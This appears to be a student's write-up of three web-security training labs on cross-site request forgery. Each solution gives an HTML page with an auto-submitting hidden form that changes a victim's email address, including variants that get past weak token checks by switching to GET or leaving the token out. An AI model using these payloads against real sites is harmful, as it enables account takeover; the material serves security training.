# Lab 1: CSRF vulnerability with no defenses

**Description :**

This lab's email change functionality is vulnerable to CSRF.

To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.

You can log in to your own account using the following credentials: `wiener:peter`

**Solution :**

First we need to log in using the given cred and then the actual over all what we done is that , we need to craft the html code , that hides the specific url and the send the /my-account/change-mail when the victim opens the link , the browser loads the send the request to the site alone with the session cookie and then the server also accept it and the does the following request and change the email id , payload that we used is
```
<html>
<body>
<script>history.pushState('', '', '/')</script>
    <form action="https://lab-port-id.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="abc&#64;gmail&#46;com" />
        <input type="submit" value="Submit request" />
    </form>
    <script>
        document.forms[0].submit();
    </script>
</body>
</html>
```

---

# Lab 2: CSRF where token validation depends on request method

**Description:**

This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

**Solution :**

As we did in the first lab , log in using the creds and then go the exploit server and then paste the payload 
```
<html>
<body>
<script>history.pushState('', '', '/')</script>
    <form action="https://0a5900100367c2c880ba2be60083007d.web-security-academy.net/my-account/change-email" method="GET">
        <input type="hidden" name="email" value="abcG&#64;gmail&#46;com" />
        <input type="submit" value="Submit request" />
    </form>
    <script>
        document.forms[0].submit();
    </script>
</body>
</html>
```

the difference between the first and second is that , at first we use the POST request method and now we are using the GET method , because **Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.**

store and then click the deliver to victim . and solve the lab

-----

## LAB 3:CSRF where token validation depends on token being present

**Description :**

This lab's email change functionality is vulnerable to CSRF.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

**Solution : **

As we did in the previous lab , the same thing we need to do is that , log in to the myaccount and then go to the exploit server , and the paste the payload 

```
<html>
<body>
<script>history.pushState('', '', '/')</script>
    <form action="https://0aff00c50336f85d800fee7900480060.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="abdc&#64;gmail&#46;com" />
        <input type="submit" value="Submit request" />
    </form>
    <script>
        document.forms[0].submit();
    </script>
</body>
</html>
```

and store and then send to the victim and  lab got solved

-----
